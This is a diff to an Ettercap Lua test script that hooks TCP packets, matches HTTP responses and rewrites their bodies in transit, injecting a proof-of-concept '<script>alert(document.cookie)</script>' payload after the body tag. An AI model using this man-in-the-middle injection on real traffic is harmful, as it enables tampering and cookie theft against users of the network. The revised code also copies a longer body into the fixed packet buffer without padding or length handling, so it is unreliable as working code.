@@ -1,10 +1,13 @@
+description = "This is a test script that will inject HTTP stuff";
+
+-- Defines our hook point as being TCP
+hook_point = Ettercap.ffi.C.HOOK_PACKET_TCP;
+
 local bit = require('bit')
 
-
 function split_http(str)
-  start,finish,header,body = string.find(str, '(.-\r?\n\r?\n)(.*)')
-
-  return header, body
+  local start,finish,header,body = string.find(str, '(.-\r?\n\r?\n)(.*)')
+  return start,finish,header, body
 end
 
 function shrink_http_body(body)
@@ -14,39 +17,36 @@ end
 
 Ettercap.log("LUA: We are inside inject_http.lua!\n")
 
-http_injector = function(po) 
-  Ettercap.log("I got the tcp!!!!!\n")
-  if (po.DATA.len > 7) then
-    local buf = Ettercap.ffi.string(po.DATA.data, 7)
-    if (buf == "HTTP/1.") then
-      -- Get the full buffer....
-      buf = Ettercap.ffi.string(po.DATA.data, po.DATA.len)
-      -- Split the header/body up so we can manipulate things.
-      header, body = split_http(buf)
-      --start,finish,header,body = string.find(buf, '(.-\r?\n\r?\n)(.*)')
-      if (not (start == nil)) then
-        -- We've got a proper split.
-        local orig_body_len = string.len(body)
-        Ettercap.log("LUA: Orig body length: " .. orig_body_len .. "\n")
-        local modified_body = shrink_http_body(body)
-        local delta = orig_body_len - string.len(modified_body)
-        -- We've tweaked things, so let's update the data.
-        if (delta > 0) then
-          Ettercap.log("LUA: We modified the HTTP response!\n")
-          modified_body = string.rep(' ', delta) .. modified_body
-          local modified_data = header .. modified_body
-          Ettercap.ffi.copy(po.DATA.data, modified_data, string.len(modified_data))
-          po.flags = bit.bor(po.flags,Ettercap.ffi.C.PO_MODIFIED)
-        end
-      end
+-- Here's your match rule.
+match_rule = function(po)
+  if (po.DATA.len <= 7) then
+    return false
+  end
+
+  local buf = Ettercap.ffi.string(po.DATA.data, 7)
+  return (buf == "HTTP/1.")
+end
+
+-- Here's your action.
+action = function(po) 
+  Ettercap.log("It's an HTTP response!!!!!!\n")
+  -- Get the full buffer....
+  local buf = Ettercap.ffi.string(po.DATA.data, po.DATA.len)
+  -- Split the header/body up so we can manipulate things.
+  local start,finish,header, body = split_http(buf)
+  -- local start,finish,header,body = string.find(buf, '(.-\r?\n\r?\n)(.*)')
+  if (not (start == nil)) then
+    -- We've got a proper split.
+    local orig_body_len = string.len(body)
+
+    local modified_body = string.gsub(body, '<body>','<body><script>alert(document.cookie)</script>')
+    -- We've tweaked things, so let's update the data.
+    if (not(modified_body == body)) then
+      Ettercap.log("LUA: We modified the HTTP response!\n")
+      local modified_data = header .. modified_body
+      Ettercap.ffi.copy(po.DATA.data, modified_data, string.len(modified_data))
+      local buf2 = Ettercap.ffi.string(po.DATA.data, po.DATA.len)
+      po.flags = bit.bor(po.flags,Ettercap.ffi.C.PO_MODIFIED)
     end
   end
 end
-
-
-Ettercap.log("LUA: Defining a TCP packet hook...\n")
-Ettercap.hook_packet_tcp(http_injector)
-Ettercap.log("LUA: hooked!\n")
-
-Ettercap.log("LUA: We are at the end of inject_http.lua. Though the script " ..
-    "will now exit, ettercap will be able to callback into Lua through FFI!\n")
